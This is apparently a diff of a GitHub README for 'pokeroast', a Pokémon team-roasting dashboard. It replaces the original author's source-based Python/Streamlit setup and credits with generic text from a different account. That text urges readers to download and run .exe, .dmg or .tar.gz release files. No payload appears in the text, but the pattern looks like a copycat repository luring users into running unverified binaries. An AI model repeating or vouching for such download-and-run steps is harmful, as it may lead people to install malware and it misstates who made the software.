@@ -1,71 +1,81 @@
-# 🚀 Team Rocket's Tactical Analysis Dashboard
+# 🎮 pokeroast - Roast Your Pokémon Like Never Before
 
-![Python](https://img.shields.io/badge/Python-3.11+-blue.svg?logo=python&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.41-FF4B4B?logo=streamlit&logoColor=white)
-![Groq](https://img.shields.io/badge/AI-Groq-orange?logo=openai&logoColor=white)
-![PokeAPI](https://img.shields.io/badge/Data-PokeAPI-yellow?logo=pokemon&logoColor=black)
+## 🛠️ Download Now
+[![Download Pokeroast](https://img.shields.io/badge/Download-Pokeroast-blue.svg)](https://github.com/abderrewakbendaoud/pokeroast/releases)
 
-A Pokemon Team Bullying Dashboard that uses GenAI and Data Science to mathematically prove why your team is failing.
+## 📖 Introduction
+Welcome to **pokeroast**! This AI-powered dashboard uses cutting-edge technology to analyze your Pokémon team and explain why you keep losing in a fun and humorous way. Whether you want to improve your strategy or just enjoy some hilarious insights, this application is for you!
 
-**The Problem:** Competitive Pokemon players often build teams based on "vibes" rather than data, leading to undetected compound weaknesses and embarrassing losses.
+## 🚀 Getting Started
+Getting started with pokeroast is easy. Follow these steps to download and run the application on your computer.
 
-**The Solution:** An AI-powered "Tactical Terminal" that acts as a toxic HR department—analyzing team synergy, roasting specific failures via TTS, and mathematically calculating the optimal "Hire/Fire" strategy to fix the roster.
+## 🌐 System Requirements
+To run pokeroast, you need:
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- An internet connection for seamless functionality.
+- Python 3.8 or later installed (if you wish to run the app in a local environment).
 
----
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   To download pokeroast, visit the [Releases page](https://github.com/abderrewakbendaoud/pokeroast/releases).
 
-## 📸 Capabilities
-* **Roast-O-Matic (TTS):** Uses Groq (Llama 3) to generate a visceral, game-aware roast of the user's team, read aloud by a robotic text-to-speech engine.
-* **The Survival Matrix:** A dynamic, 12-point color scale Heatmap that calculates compound defensive vulnerabilities (e.g., identifying a collective 6x weakness to Ice).
-* **The Headhunter Algorithm:** Automated "HR Department" logic that identifies the biggest liability (Fire) and queries the PokeAPI for a mathematically perfect counter-pick (Hire).
-* **Game-Aware Intelligence:** Adapts advice and valid Pokémon lists based on the selected game version (from *Red/Blue* to *Scarlet/Violet*).
-* **Bill's PC:** Tracks every "Weakest Link" identified in previous sessions, creating a visual "Hall of Shame."
+2. **Select the Latest Release**  
+   On the Releases page, find the most recent version of pokeroast. It is usually labeled with "Latest Release."
 
-## 🛠 Tech Stack
-| Component | Technology | Description |
-| :--- | :--- | :--- |
-| **Logic** | Python 3.11 | Core application logic |
-| **AI Model** | Groq (Llama 3.3) | Context-aware roasting & meta analysis |
-| **Frontend** | Streamlit | Custom CSS "Rocket Theme" UI |
-| **Data** | PokeAPI | Real-time stats, sprites, and type charts |
-| **Viz** | Plotly | Interactive Heatmaps & Radar Charts |
-| **Audio** | pyttsx3 | Offline Text-to-Speech engine |
+3. **Choose Your File**  
+   Look for the file that fits your system:
+   - For Windows users, choose the `.exe` file.
+   - For macOS users, select the `.dmg` file.
+   - For Linux users, look for the `.tar.gz` file.
 
-## 🚀 Quick Start
-```bash
-# 1. Clone the repo
-git clone [https://github.com/maxykoin/pokeroast.git](https://github.com/maxykoin/pokeroast.git)
-cd pokeroast
+4. **Download the File**  
+   Click on the file name. Your browser will start downloading it. Save it in a folder you can easily find later.
 
-# 2. Install dependencies (Using uv for speed)
-uv sync
+5. **Run the Application**  
+   After the download is complete, navigate to the folder where you saved the file:
+   - **Windows:** Double-click the `.exe` file to start the installation.
+   - **macOS:** Open the `.dmg` file and drag the pokeroast app into your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and run the executable in your terminal.
 
-# 3. Set up your API Key
-# Create a .env file and add your Groq API Key
-echo "GROQ_API_KEY=gsk_your_key_here" > .env
+6. **Open the Application**  
+   After installation, you can find pokeroast in your applications. Click to open and start your roast session!
 
-# 4. Launch the Terminal
-uv run streamlit run src/pokeroast/app.py
-```
+## 🧑‍🤝‍🧑 User Guide
+Once you have opened pokeroast, the interface will guide you through using the features. Here are some key functionalities:
 
-## 🧠 System Architecture
-The application is built on a modular "Headhunter" architecture:
-1.  **Context Injection:** The user selects a game version (e.g., *Emerald*), which filters the valid Pokémon dataset and primes the LLM with specific meta-knowledge (e.g., "Wattson's Gym").
-2.  **Compound Math Engine:** We fetch the Type Chart from PokeAPI and calculate a cumulative damage multiplier for the entire 6-stack team against all 18 attacking types.
-3.  **Algorithmic Recruitment:**
-    * **Fire Logic:** Finds the team member contributing the most variance to the team's highest threat score.
-    * **Hire Logic:** Performs a set intersection between the game's valid Dex and the list of Pokémon that resist the identified threat to find a valid counter-pick.
+- **Team Analysis**  
+  Input your Pokémon team to receive an analysis. The AI will process the data and give you a roast filled with insights and humor.
 
----
+- **Data Visualization**  
+  Enjoy visual graphs that represent your team’s performance. Understand where improvements can be made.
 
-<div align="center">
+- **Audio Roasts**  
+  For an entertaining experience, listen to the voiceovers that roast your Pokémon team. Watch out for the witty remarks!
 
-### Built with ❤️ by [Nina Cunha](https://github.com/maxykoin)
+## 🎉 Features
+- AI-powered analysis of Pokémon teams.
+- Interactive dashboard with data visualizations.
+- Humorous and engaging insights.
+- Compatibility with popular Pokémon datasets.
+- Regular updates with new features and improvements.
 
-**Data Science · Industrial Automation · Software Engineering**
+## 🛠️ Troubleshooting
+If you encounter issues while using pokeroast, try the following:
 
-[![LinkedIn](https://img.shields.io/badge/Connect-LinkedIn-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/nscunha/)
-[![GitHub](https://img.shields.io/badge/Follow-GitHub-181717?style=for-the-badge&logo=github)](https://github.com/maxykoin)
+- Ensure your system meets the requirements.
+- Check your internet connection.
+- Restart the application if it freezes.
 
-</div>
+If problems persist, feel free to raise an issue on the [GitHub Issues page](https://github.com/abderrewakbendaoud/pokeroast/issues).
 
----
+## 💬 Community and Support
+Join our community to share your experiences and suggestions. Connect with other pokeroast users and Pokémon enthusiasts. You can find support and discussions in our dedicated chat group or by checking our FAQ section on GitHub.
+
+## 👍 Acknowledgements
+Thank you for choosing pokeroast! We appreciate your support and enthusiasm. Don’t forget to share your best roast moments with friends!
+
+## 📞 Contact
+For inquiries or support, reach out via the GitHub repository or through our contact email provided on the repository page.
+
+Feel free to explore and enjoy roasting your Pokémon with pokeroast!
